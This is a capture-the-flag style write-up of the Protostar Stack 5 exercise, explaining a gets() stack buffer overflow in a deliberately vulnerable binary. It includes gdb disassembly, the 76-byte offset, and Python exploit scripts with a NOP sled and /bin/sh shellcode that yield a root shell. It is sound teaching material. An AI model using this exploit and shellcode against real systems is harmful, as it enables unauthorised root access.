# PROTOSTAR : STACK 5
[Protostar:Stack5](https://exploit.education/protostar/stack-five/)

### **SOURCE CODE**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### **CODE ANALYSIS**
#### Vulnerability
- Stack Buffer Overflow

The program takes command line input and there is a **buffer** variable which we can overflow since it takes input in vulnerable **gets()** function. But after overflowing the **buffer** where would we go? unlike the previous challenge there is **no win() function** so we need to return to a **stack address** and place our **shellcode** to get **ROOT SHELL**.

### **SOLUTION**
Below is the disassembly of the **main()** function
```
user@protostar:/opt/protostar/bin$ gdb -q stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave  
0x080483da <main+22>:   ret    
End of assembler dump.
(gdb) 
```

Now lets find the padding required to overwrite the **instrution pointer** and modify the return address of the program.
<br>
**Padding = 76** to overwrite **eip** register.
<br>
If you observe the **esp** register, it denotes the stack address to which the **eip** returns to. Now this address is random so we can take the help of **NOP SLED** and check whether we can run **assembler code**.
```
(gdb) b *0x080483da
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) r
Starting program: /opt/protostar/bin/stack5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41414149
) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) x/2x $ebp
0x41414141:     Cannot access memory at address 0x41414141
(gdb) x/i $eip
0x80483da <main+22>:    ret    
(gdb) si
Cannot access memory at address 0x41414145
(gdb) i r
eax            0xbffff770       -1073744016
ecx            0xbffff770       -1073744016
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7c0       0xbffff7c0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0xb7eadc00       0xb7eadc00 <__libc_start_main+112>
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) 
```
#### **PYTHON SCRIPT**
```py                                   
import struct
padding = "A"*76

ret = struct.pack("I",0xbffff7c0)

nop = "\x90"*100

trap = "\xCC"*4

print(padding + ret + nop + trap)

```

The **\xCC** instruction causes **SIGTRAP** which interupts the execution of the program. It is usually generated when the CPU hits a **breakpoint**. Below is the program output based on the python script.
<br>
Now that we know assembler code is running lets replace with a **shellcode**.
```
(gdb) r < /tmp/exploit
Starting program: /opt/protostar/bin/stack5 < /tmp/exploit

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41414149
) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff825 in ?? ()
(gdb) 
```

This is the shellcode for linux /bin/sh shell 22 bytes. **struct pack** is to convert the address to bytes.

```py
import struct
padding = "A"*76

ret = struct.pack("I",0xbffff7c0)

nop = "\x90"*100

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print(padding + ret + nop + shellcode)
```

Just piping the program output to ./stack5 won't work because the shell needs an input so **cat** command is used.
We got the root shell.
```
user@protostar:/tmp$ (python exploit.py; cat) | /opt/protostar/bin/stack5
whoami
root
```
